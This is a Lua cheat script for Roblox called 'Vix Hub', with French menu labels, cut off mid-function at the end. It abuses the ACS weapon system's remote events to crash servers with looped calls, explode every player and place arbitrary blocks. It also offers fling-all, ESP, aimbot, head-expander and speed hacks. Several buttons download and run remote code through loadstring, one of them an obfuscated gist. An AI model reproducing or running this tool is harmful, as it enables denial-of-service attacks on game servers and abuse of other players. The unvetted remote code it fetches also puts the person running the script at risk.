local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

-- [< Variables >]

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")

-- Variables

local currentSpeed = 16 -- valeur de base
local speedLoopRunning = false

-- Fonction pour appliquer en boucle la vitesse
local function applySpeed(speed)
    currentSpeed = speed
    if speedLoopRunning then return end
    speedLoopRunning = true

    task.spawn(function()
        while speedLoopRunning do
            pcall(function()
                local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
                local hum = char:FindFirstChildOfClass("Humanoid")
                if hum and hum.WalkSpeed ~= currentSpeed then
                    hum.WalkSpeed = currentSpeed
                end
            end)
            task.wait(0.1)
        end
    end)
end

-- Quand le joueur respawn
LocalPlayer.CharacterAdded:Connect(function()
    task.wait(1)
    applySpeed(currentSpeed)
end)

-- Fonction pour trouver le joueur le plus proche dans le FOV
local function getClosestPlayer()
    local closest = nil
    local shortestDistance = AimbotSettings.FOV or 100

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            if AimbotSettings.TeamCheck and player.Team == LocalPlayer.Team then
                continue
            end

            local part = player.Character:FindFirstChild("Head") or player.Character:FindFirstChild("HumanoidRootPart")
            if not part then continue end

            if AimbotSettings.WallCheck then
                local ray = Ray.new(workspace.CurrentCamera.CFrame.Position, (part.Position - workspace.CurrentCamera.CFrame.Position).Unit * 999)
                local hitPart = workspace:FindPartOnRay(ray, LocalPlayer.Character)
                if hitPart and not part:IsDescendantOf(hitPart) then
                    continue
                end
            end

            local screenPos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(part.Position)
            if onScreen then
                local mouse = game:GetService("UserInputService"):GetMouseLocation()
                local distance = (Vector2.new(mouse.X, mouse.Y) - Vector2.new(screenPos.X, screenPos.Y)).Magnitude

                if distance < shortestDistance then
                    shortestDistance = distance
                    closest = part
                end
            end
        end
    end

    return closest
end

local Window = Rayfield:CreateWindow({
   Name = "▶ Vix Hub ◀",
   Icon = 0, 
   LoadingTitle = "Loading...",
   LoadingSubtitle = "by VixHub",
   Theme = "Ocean",

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false,

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil,
      FileName = "Private"
   },

   Discord = {
      Enabled = true,
      Invite = "https://discord.gg/w92d9hnT2p",
      RememberJoins = true
   },

   KeySystem = false,
   KeySettings = {
      Title = "VixHub - SystemKey",
      Subtitle = "Key System",
      Note = "Achète ta key sur https://vixhub.sellhub.cx/",
      FileName = "Key",
      SaveKey = true,
      GrabKeyFromSite = true,
      Key = "http://node.zenlihosting.eu:25569/Keys/Keys.txt"
   }
})

local Tab = Window:CreateTab("ACS 1.7.5", "wrench") 

local Section = Tab:CreateSection("Whizz all")

Tab:CreateToggle({
    Name = "Whizz All",
    CurrentValue = false,
    Flag = "Whizz",
    Callback = function(value)
        WhizzAllActive = value
        if WhizzAllActive then
            task.spawn(function()
                while WhizzAllActive do
                    for _, player in pairs(game.Players:GetPlayers()) do
                        game:GetService('ReplicatedStorage').Game_MainRS.Acs.Eventos.Whizz:FireServer(player)
                    end
                    task.wait(0.1)
                end
            end)
        end
    end,
})


local Section = Tab:CreateSection("Crash server")


Tab:CreateButton({
   Name = "Crash Server V1",
   Callback = function()
    while task.wait() do

   for i = 1, 30 do
       game:GetService('ReplicatedStorage').Game_MainRS.Acs.Eventos.ServerBullet:FireServer(Vector3.new(0/0/0),Vector3.new(0/0/0))
   end
end
   end,
})

Tab:CreateButton({
   Name = "Crash Server V2",
   Callback = function()
game:GetService('ReplicatedStorage').Game_MainRS.Acs.Eventos.Breach:FireServer(3,{Fortified={},Destroyable=workspace},CFrame.new(),CFrame.new(),{CFrame={},Size={}})
   end,
})

local Section = Tab:CreateSection("Trigger breach")

local Size = {
   X = 1,
   Y = 1,
   Z = 1
}

local InputX = Tab:CreateInput({
   Name = "X",
   CurrentValue = tostring(Size.X),
   PlaceholderText = "EX 100000",
   RemoveTextAfterFocusLost = false,
   Flag = "Input1",
   Callback = function(text)
      Size.X = tonumber(text) or Size.X
   end,
})

local InputY = Tab:CreateInput({
   Name = "Y",
   CurrentValue = tostring(Size.Y),
   PlaceholderText = "EX 10",
   RemoveTextAfterFocusLost = false,
   Flag = "Input2",
   Callback = function(text)
      Size.Y = tonumber(text) or Size.Y
   end,
})

local InputZ = Tab:CreateInput({
   Name = "Z",
   CurrentValue = tostring(Size.Z),
   PlaceholderText = "EX 10000",
   RemoveTextAfterFocusLost = false,
   Flag = "Input3",
   Callback = function(text)
      Size.Z = tonumber(text) or Size.Z
   end,
})

Tab:CreateButton({
   Name = "Placer le bloc",
   Callback = function()
      local player = game.Players.LocalPlayer
      local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
      if not hrp then
         warn("HumanoidRootPart introuvable")
         return
      end
      
      game:GetService('ReplicatedStorage').Game_MainRS.Acs.Eventos.Breach:FireServer(
         3,
         {Fortified = {}, Destroyable = workspace},
         CFrame.new(),
         CFrame.new(),
         {
            CFrame = hrp.CFrame,
            Size = Size
         }
      )
   end,
})

local Section = Tab:CreateSection("Armes ACS trouvÃ©es")

Tab:CreateButton({
   Name = "Give arme acs",
   Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
   end,
})

local Section = Tab:CreateSection("Explode all player")

Tab:CreateButton({
   Name = "Trigger explosion",
   Callback = function()
local player = game.Players.LocalPlayer
    local Evt = game.ReplicatedStorage.Game_MainRS.Acs.Eventos
    local Settings = {
        ["ExplosiveHit"] = true,
        ["ExPressure"] = math.huge,
        ["ExpRadius"] = 10,  
        ["DestroyJointRadiusPercent"] = 1,
        ["ExplosionDamage"] = 500, 
    }

    
    local function explodePlayer()
        for _, v in pairs(game.Players:GetChildren()) do
            if v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
                local hitPosition = v.Character.HumanoidRootPart.Position
                Evt.Hit:FireServer(hitPosition, v.Character.HumanoidRootPart, hitPosition, Enum.Material.Plastic, Settings)
            end
        end
    end

 
    while true do
        pcall(function()
            explodePlayer()
        end)
        wait(1)  
    end
end,
})

local Section = Tab:CreateSection("Click to boom")

Tab:CreateButton({
   Name = "Click to boom",
   Callback = function()
local function createExplosiveBulletACS(position, direction)
        
        local bullet = Instance.new("Part")
        bullet.Size = Vector3.new(1, 1, 1)
        bullet.Shape = Enum.PartType.Ball
        bullet.Position = position
        bullet.Anchored = false
        bullet.CanCollide = true
        bullet.Material = Enum.Material.SmoothPlastic
        bullet.Color = Color3.fromRGB(255, 0, 0)  -- Rouge
        bullet.Parent = workspace

       
        local velocity = Instance.new("BodyVelocity")
        velocity.MaxForce = Vector3.new(10000, 10000, 10000)
        velocity.Velocity = direction * 100  
        velocity.Parent = bullet

        
        bullet.Touched:Connect(function(hit)
            if hit then
                
                local Evt = game.ReplicatedStorage.Game_MainRS.Acs.Eventos
                local Settings = {
                    ["ExplosiveHit"] = true,
                    ["ExPressure"] = math.huge,
                    ["ExpRadius"] = 10,  
                    ["DestroyJointRadiusPercent"] = 1,
                    ["ExplosionDamage"] = 500,  
                }

                
                local hitPosition = hit.Parent:FindFirstChild("HumanoidRootPart") and hit.Parent.HumanoidRootPart.Position or hit.Position
                
                Evt.Hit:FireServer(hitPosition, hit, hitPosition, Enum.Material.Plastic, Settings)

               
                bullet:Destroy()
            end
        end)
    end

    
    local player = game.Players.LocalPlayer
    local mouse = player:GetMouse()

    
    mouse.Button1Down:Connect(function()
        
        local position = player.Character.HumanoidRootPart.Position
        local direction = (mouse.Hit.p - position).unit  
        createExplosiveBulletACS(position, direction)
    end)
end,
})

local Section = Tab:CreateSection("Explosif bullet")

Tab:CreateButton({
   Name = "Explosif bullet",
   Callback = function()
loadstring(game:HttpGet(('https://gist.githubusercontent.com/GattoHow/b85425bc886f6e0c11bc27191b51c112/raw/97cabe0ab4a3650e793028669fee5eb3d76f735e/ACS%20EDITOR%20OBFUSCADO'),true))()
   end,
})

local Tab = Window:CreateTab("ACS 2.0.1", "wrench")

local Section = Tab:CreateSection("Crash server")

Tab:CreateButton({
   Name = "Crash Server",
   Callback = function()
    while task.wait() do

  for _, player in next, game.Players:GetPlayers() do
     game:GetService("ReplicatedStorage").Game_MainRS.Acs.Eventos.Suppression:FireServer(player, 666, 666, 666)
  end
end
   end,
})

local Section = Tab:CreateSection("Whizz server")

Tab:CreateButton({
   Name = "Whizz all",
   Callback = function()
while task.wait() do

  for _, player in next, game.Players:GetPlayers() do
      game:GetService('ReplicatedStorage').Game_MainRS.Acs.Eventos.Whizz:FireServer(player)
        end
    end
end,
})

local Section = Tab:CreateSection("Bunnyhop")

Tab:CreateButton({
   Name = "Bunnyhop",
   Callback = function()
local cfg = require(game:GetService('ReplicatedStorage').Game_MainRS.Acs.GameRules.Config)
cfg.AntiBunnyHop = false
end,
})

local Section = Tab:CreateSection("Inf stam")

Tab:CreateButton({
   Name = "Inf stam",
   Callback = function()
local cfg = require(game:GetService('ReplicatedStorage').Game_MainRS.Acs.GameRules.Config)
cfg.EnableStamina = false
end,
})

-- [< TP >]

local Main = Window:CreateTab("Save TP / TP Position", "bring-to-front")

--------------------------------------------------
-- Sauvegarde/TP Position (optimisé)
--------------------------------------------------
_G.plrpos = nil
Main:CreateButton({
   Name = "🚩 Save Position",
   Callback = function()
      local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
      local torso = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
      if torso then
         _G.plrpos = torso.CFrame.Position
         Rayfield:Notify({ Title = "Position saved", Content = "Position enregistrée !", Duration = 3 })
      else
         Rayfield:Notify({ Title = "Erreur", Content = "Aucun Torso trouvé !", Duration = 3 })
      end
   end,
})
Main:CreateButton({
   Name = "🌌 Teleport to Position",
   Callback = function()
      if _G.plrpos then
         local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
         local torso = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
         if torso then
            torso.CFrame = CFrame.new(_G.plrpos)
            Rayfield:Notify({ Title = "Teleported", Content = "Téléporté à la position sauvegardée !", Duration = 3 })
         else
            Rayfield:Notify({ Title = "Erreur", Content = "Aucun Torso trouvé !", Duration = 3 })
         end
      else
         Rayfield:Notify({ Title = "Erreur", Content = "Aucune position sauvegardée !", Duration = 3 })
      end
   end,
})
-- [< Fling >]

local Tab = Window:CreateTab("Fling", "plane")

local Button = Tab:CreateButton({
   Name = "Fling all",
   Callback = function()
   game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "Script Executed";
    Text = "Fling All";
    Duration = 6;
})
 
local Targets = {"All"} -- "All", "Target Name", "arian_was_here"
 
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
 
local AllBool = false
 
local GetPlayer = function(Name)
    Name = Name:lower()
    if Name == "all" or Name == "others" then
        AllBool = true
        return
    elseif Name == "random" then
        local GetPlayers = Players:GetPlayers()
        if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
        return GetPlayers[math.random(#GetPlayers)]
    elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
        for _,x in next, Players:GetPlayers() do
            if x ~= Player then
                if x.Name:lower():match("^"..Name) then
                    return x;
                elseif x.DisplayName:lower():match("^"..Name) then
                    return x;
                end
            end
        end
    else
        return
    end
end
 
local Message = function(_Title, _Text, Time)
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
end
 
local SkidFling = function(TargetPlayer)
    local Character = Player.Character
    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Humanoid and Humanoid.RootPart
 
    local TCharacter = TargetPlayer.Character
    local THumanoid
    local TRootPart
    local THead
    local Accessory
    local Handle
 
    if TCharacter:FindFirstChildOfClass("Humanoid") then
        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
    end
    if THumanoid and THumanoid.RootPart then
        TRootPart = THumanoid.RootPart
    end
    if TCharacter:FindFirstChild("Head") then
        THead = TCharacter.Head
    end
    if TCharacter:FindFirstChildOfClass("Accessory") then
        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
    end
    if Accessoy and Accessory:FindFirstChild("Handle") then
        Handle = Accessory.Handle
    end
 
    if Character and Humanoid and RootPart then
        if RootPart.Velocity.Magnitude < 50 then
            getgenv().OldPos = RootPart.CFrame
        end
        if THumanoid and THumanoid.Sit and not AllBool then
            return Message("Error Occurred", "Targeting is sitting", 5) -- u can remove dis part if u want lol
        end
        if THead then
            workspace.CurrentCamera.CameraSubject = THead
        elseif not THead and Handle then
            workspace.CurrentCamera.CameraSubject = Handle
        elseif THumanoid and TRootPart then
            workspace.CurrentCamera.CameraSubject = THumanoid
        end
        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
            return
        end
 
        local FPos = function(BasePart, Pos, Ang)
            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
        end
 
        local SFBasePart = function(BasePart)
            local TimeToWait = 2
            local Time = tick()
            local Angle = 0
 
            repeat
                if RootPart and THumanoid then
                    if BasePart.Velocity.Magnitude < 50 then
                        Angle = Angle + 100
 
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                    else
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
                    end
                else
                    break
                end
            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
        end
 
        workspace.FallenPartsDestroyHeight = 0/0
 
        local BV = Instance.new("BodyVelocity")
        BV.Name = "EpixVel"
        BV.Parent = RootPart
        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
 
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
 
        if TRootPart and THead then
            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
                SFBasePart(THead)
            else
                SFBasePart(TRootPart)
            end
        elseif TRootPart and not THead then
            SFBasePart(TRootPart)
        elseif not TRootPart and THead then
            SFBasePart(THead)
        elseif not TRootPart and not THead and Accessory and Handle then
            SFBasePart(Handle)
        else
            return Message("Error Occurred", "Target is missing everything", 5)
        end
 
        BV:Destroy()
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        workspace.CurrentCamera.CameraSubject = Humanoid
 
        repeat
            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
            Humanoid:ChangeState("GettingUp")
            table.foreach(Character:GetChildren(), function(_, x)
                if x:IsA("BasePart") then
                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
                end
            end)
            task.wait()
        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
        workspace.FallenPartsDestroyHeight = getgenv().FPDH
    else
        return Message("Error Ocurrido", "El Script A Fallado", 5)
    end
end
 
if not Welcome then Message("By Augus X", "", 6) end
getgenv().Welcome = true
if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end
 
if AllBool then
    for _,x in next, Players:GetPlayers() do
        SkidFling(x)
    end
end
 
for _,x in next, Targets do
    if GetPlayer(x) and GetPlayer(x) ~= Player then
        if GetPlayer(x).UserId ~= 2924145477 then
            local TPlayer = GetPlayer(x)
            if TPlayer then
                SkidFling(TPlayer)
            end
        else
            Message("ERROR AL ASER FLING", "", 8)
        end
    elseif not GetPlayer(x) and not AllBool then
        Message("ERROR OCURRIDO", "NO SE LE ISO FLING", 8)
    end
end
   end,
})

local Tab = Window:CreateTab("PVP", "swords")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local highlights = {}
local nameTags = {}

local function GetTeamColor(player)
    if player.Team and player.Team.TeamColor then
        return player.Team.TeamColor.Color
    else
        return Color3.fromRGB(255, 255, 255)
    end
end

local function CreateNameTag(player)
    if not player.Character or not player.Character:FindFirstChild("Head") then return nil end

    local billboard = Instance.new("BillboardGui")
    billboard.Name = "NameTag"
    billboard.Adornee = player.Character.Head
    billboard.Size = UDim2.new(0, 200, 0, 50)
    billboard.StudsOffset = Vector3.new(0, 2.5, 0)
    billboard.AlwaysOnTop = true

    local textLabel = Instance.new("TextLabel", billboard)
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.TextStrokeTransparency = 0
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.TextSize = 14

    return billboard, textLabel
end

local function EnableESP()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Head") then
            if not highlights[player] then
                local highlight = Instance.new("Highlight")
                highlight.Adornee = player.Character
                highlight.FillColor = GetTeamColor(player)
                highlight.OutlineColor = Color3.new(1,1,1)
                highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                highlight.Parent = player.Character
                highlights[player] = highlight
            end
            if not nameTags[player] then
                local billboard, textLabel = CreateNameTag(player)
                if billboard then
                    billboard.Parent = player.Character
                    nameTags[player] = {Billboard = billboard, TextLabel = textLabel}
                end
            end
            if nameTags[player] then
                local teamName = player.Team and player.Team.Name or "NONE"
                nameTags[player].TextLabel.Text = teamName .. " @ " .. player.Name
                nameTags[player].TextLabel.TextColor3 = GetTeamColor(player)
            end
        end
    end
end

local function DisableESP()
    for player, highlight in pairs(highlights) do
        if highlight and highlight.Parent then
            highlight:Destroy()
        end
    end
    highlights = {}

    for player, tagData in pairs(nameTags) do
        if tagData.Billboard and tagData.Billboard.Parent then
            tagData.Billboard:Destroy()
        end
    end
    nameTags = {}
end

local function UpdateESP()
    for player, highlight in pairs(highlights) do
        if player.Team and highlight then
            highlight.FillColor = GetTeamColor(player)
        end
    end

    for player, tagData in pairs(nameTags) do
        if player.Team and tagData.TextLabel then
            local teamName = player.Team.Name or "NONE"
            tagData.TextLabel.Text = teamName .. " @ " .. player.Name
            tagData.TextLabel.TextColor3 = GetTeamColor(player)
        end
    end
end


local Toggle = Tab:CreateToggle({
    Name = "ESP Chams",
    CurrentValue = false,
    Flag = "ESPChamsToggle",
    Callback = function(Value)
        if Value then
            EnableESP()
           
            local conn
            conn = game:GetService("RunService").RenderStepped:Connect(function()
                if not Toggle:GetValue() then
                    conn:Disconnect()
                    DisableESP()
                else
                    UpdateESP()
                end
            end)
        else
            DisableESP()
        end
    end,
})

-- Aimbot Configuration
local AimbotTab = Window:CreateTab("Aimbot", "target")
local Aimbot = nil

-- Load Aimbot
local function LoadAimbot()
    if not Aimbot then
        Aimbot = loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Aimbot-V3/main/src/Aimbot.lua"))()
        Aimbot.Load()
    end
    return Aimbot
end

-- Main Toggle
local AimbotToggle = AimbotTab:CreateToggle({
    Name = "Activer l'Aimbot",
    CurrentValue = false,
    Flag = "AimbotEnabled",
    Callback = function(Value)
        if Value then
            LoadAimbot()
            Aimbot.Settings.Enabled = true
        elseif Aimbot then
            Aimbot.Settings.Enabled = false
        end
    end,
})

-- Team Check
AimbotTab:CreateToggle({
    Name = "Vérifier l'équipe",
    CurrentValue = false,
    Flag = "AimbotTeamCheck",
    Callback = function(Value)
        if Aimbot then
            Aimbot.Settings.TeamCheck = Value
        end
    end,
})

-- Wall Check
AimbotTab:CreateToggle({
    Name = "Vérifier les murs",
    CurrentValue = false,
    Flag = "AimbotWallCheck",
    Callback = function(Value)
        if Aimbot then
            Aimbot.Settings.WallCheck = Value
        end
    end,
})

-- FOV Settings
AimbotTab:CreateSlider({
    Name = "Taille du FOV",
    Range = {0, 500},
    Increment = 5,
    Suffix = "px",
    CurrentValue = 90,
    Flag = "AimbotFOVSize",
    Callback = function(Value)
        if Aimbot then
            Aimbot.FOVSettings.Radius = Value
        end
    end,
})

-- FOV Color Picker
AimbotTab:CreateColorPicker({
    Name = "Couleur du FOV",
    Color = Color3.fromRGB(255, 255, 255),
    Flag = "AimbotFOVColor",
    Callback = function(Value)
        if Aimbot then
            Aimbot.FOVSettings.Color = Value
        end
    end
})

-- Lock Part Dropdown
AimbotTab:CreateDropdown({
    Name = "Partie à viser",
    Options = {"Head", "HumanoidRootPart", "Torso"},
    CurrentOption = "Head",
    Flag = "AimbotLockPart",
    Callback = function(Value)
        if Aimbot then
            Aimbot.Settings.LockPart = Value
        end
    end,
})

-- Sensitivity Slider
AimbotTab:CreateSlider({
    Name = "Sensibilité",
    Range = {0.1, 10},
    Increment = 0.1,
    Suffix = "x",
    CurrentValue = 3.5,
    Flag = "AimbotSensitivity",
    Callback = function(Value)
        if Aimbot then
            Aimbot.Settings.Sensitivity2 = Value
        end
    end,
})

-- Toggle Mode
AimbotTab:CreateToggle({
    Name = "Mode Toggle",
    CurrentValue = false,
    Flag = "AimbotToggleMode",
    Callback = function(Value)
        if Aimbot then
            Aimbot.Settings.Toggle = Value
        end
    end,
})

-- FOV Visibility Toggle
AimbotTab:CreateToggle({
    Name = "Afficher le FOV",
    CurrentValue = true,
    Flag = "AimbotFOVVisible",
    Callback = function(Value)
        if Aimbot then
            Aimbot.FOVSettings.Visible = Value
        end
    end,
})

-- Button to load the aimbot
AimbotTab:CreateButton({
    Name = "🔁 Recharger l'Aimbot",
    Callback = function()
        if Aimbot and Aimbot.Exit then
            Aimbot:Exit()
        end
        Aimbot = nil
        LoadAimbot()
        Rayfield:Notify({
            Title = "Aimbot rechargé",
            Content = "L'aimbot a été rechargé avec succès.",
            Duration = 3,
        })
    end,
})

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Team Tab
local TeamTab = Window:CreateTab("Team", "users")

-- Team Input
local TeamInput = TeamTab:CreateInput({
   Name = "Nom de l'équipe",
   PlaceholderText = "Entrez le nom de l'équipe",
   RemoveTextAfterFocusLost = false,
   Callback = function(Text)
       -- This callback will be used when the input is confirmed
   end,
})

-- Team Button
TeamTab:CreateButton({
   Name = "Rejoindre l'équipe",
   Callback = function()
       local teamName = TeamInput.Input.Text
       if teamName and teamName ~= "" then
           -- Try to find the team
           local team = game:GetService("Teams"):FindFirstChild(teamName)
           
           if team then
               -- If team exists, try to join it
               LocalPlayer.Team = team
               Rayfield:Notify({
                   Title = "Équipe rejoint",
                   Content = "Vous avez rejoint l'équipe: " .. teamName,
                   Duration = 3,
               })
           else
               -- If team doesn't exist, create it
               local newTeam = Instance.new("Team")
               newTeam.Name = teamName
               newTeam.TeamColor = BrickColor.Random()
               newTeam.Parent = game:GetService("Teams")
               
               LocalPlayer.Team = newTeam
               Rayfield:Notify({
                   Title = "Équipe créée",
                   Content = "Nouvelle équipe créée: " .. teamName,
                   Duration = 3,
               })
           end
       else
           Rayfield:Notify({
               Title = "Erreur",
               Content = "Veuillez entrer un nom d'équipe valide.",
               Duration = 3,
           })
       end
   end,
})

-- List existing teams
TeamTab:CreateButton({
   Name = "Lister les équipes",
   Callback = function()
       local teams = game:GetService("Teams"):GetChildren()
       local teamList = ""
       
       for _, team in ipairs(teams) do
           if team:IsA("Team") then
               teamList = teamList .. "- " .. team.Name .. " (" .. #team:GetPlayers() .. " joueurs)\n"
           end
       end
       
       Rayfield:Notify({
           Title = "Liste des équipes",
           Content = teamList ~= "" and teamList or "Aucune équipe disponible",
           Duration = 6,
       })
   end,
})

local currentScale = 1

local function expandHead(character, scale)
    local head = character:FindFirstChild("Head")
    if head and head:IsA("BasePart") then
        head.Size = Vector3.new(2, 1, 1)
        local mesh = head:FindFirstChildOfClass("SpecialMesh") or head:FindFirstChildOfClass("Mesh")
        if mesh then
            mesh:Destroy()
        end
        head.Size = head.Size * scale
        head.CanCollide = true
    end
end

local function applyScaleToAll(scale)
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            expandHead(player.Character, scale)
        end
    end
end

Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(character)
        wait(1)
        expandHead(character, currentScale)
    end)
end)

local Slider = Tab:CreateSlider({
   Name = "HEAD EXPANDER",
   Range = {1, 10},
   Increment = 0.1,
   Suffix = "x Head Size",
   CurrentValue = 1,
   Flag = "Slider1",
   Callback = function(Value)
       currentScale = Value
       applyScaleToAll(currentScale)
   end,
})

-- [< Utility >]

local Utility = Window:CreateTab("Utility", "app-window") 

local Button = Utility:CreateButton({
   Name = "Infinite Yield",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
   end,
})

local Button2 = Utility:CreateButton({
   Name = "Dex",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
   end,
})

local BypassButton = Utility:CreateButton({
   Name = "Bypass VC",
   Callback = function()
      game:GetService("VoiceChatService"):joinVoice()
      Rayfield:Notify({
         Title = "Bypass VC",
         Content = "Voice Chat activé avec succès.",
         Duration = 5,
      })
   end
})
-- Input avec notifs Rayfield
Utility:CreateInput({
   Name = "🏃‍♂️ Set WalkSpeed",
   CurrentValue = tostring(currentSpeed),
   PlaceholderText = "Default : 16",
   RemoveTextAfterFocusLost = true,
   Callback = function(Text)
      local speed = tonumber(Text)
      if speed then
         applySpeed(speed)
         Rayfield:Notify({
            Title = "✅ Vitesse changée",
            Content = "Tu marches maintenant à " .. speed .. " de speed.",
            Duration = 5,
            Image = "bell",
         })
      else
         Rayfield:Notify({
            Title = "❌ Erreur",
            Content = "Merci d'entrer un nombre valide (ex: 30)",
            Duration = 5,
            Image = "bell",
         })
      end
   end,
})

-- Création du toggle
local Toggle = Utility:CreateToggle({
   Name = "Afficher ESP (Pseudos + Boîte)",
   CurrentValue = false,
   Flag = "ESP_Toggle",
   Callback = function(Value)
      espEnabled = Value

      -- Fonction pour créer l'ESP
      local function createESP(player)
         if player == Players.LocalPlayer then return end
         if not player.Character then return end
         local character = player.Character
         local head = character:FindFirstChild("Head")
         local root = character:FindFirstChild("HumanoidRootPart")

         if not head or not root then return end
         if espData[player] then return end

         -- Pseudo au-dessus de la tête
         local billboard = Instance.new("BillboardGui")
         billboard.Name = "ESP_Name"
         billboard.Adornee = head
         billboard.Size = UDim2.new(0, 200, 0, 50)
         billboard.StudsOffset = Vector3.new(0, 2, 0)
         billboard.AlwaysOnTop = true
         billboard.Parent = game.CoreGui

         local nameLabel = Instance.new("TextLabel")
         nameLabel.Size = UDim2.new(1, 0, 1, 0)
         nameLabel.BackgroundTransparency = 1
         nameLabel.Text = player.Name
         nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
         nameLabel.TextStrokeTransparency = 0.5
         nameLabel.TextScaled = true
         nameLabel.Font = Enum.Font.SourceSansBold
         nameLabel.Parent = billboard

         -- SelectionBox (contour du joueur)
         local box = Instance.new("SelectionBox")
         box.Name = "ESP_Box"
         box.Adornee = character
         box.LineThickness = 0.05
